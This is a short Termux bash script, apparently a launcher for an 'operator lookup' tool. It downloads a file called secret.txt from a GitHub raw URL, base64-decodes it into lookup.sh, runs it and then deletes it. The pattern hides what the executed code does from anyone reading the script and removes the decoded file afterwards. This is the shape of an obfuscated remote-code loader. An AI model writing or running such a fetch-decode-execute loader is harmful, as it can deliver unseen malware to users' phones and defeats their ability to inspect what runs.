#!/data/data/com.termux/files/usr/bin/bash

# Download the secret base64 file and decode to script
curl -sL https://raw.githubusercontent.com/termuxtoolshub/operator-lookup/main/secret.txt | base64 -d > lookup.sh

# Run the decoded script interactively
bash lookup.sh

# Delete temp file
rm lookup.sh
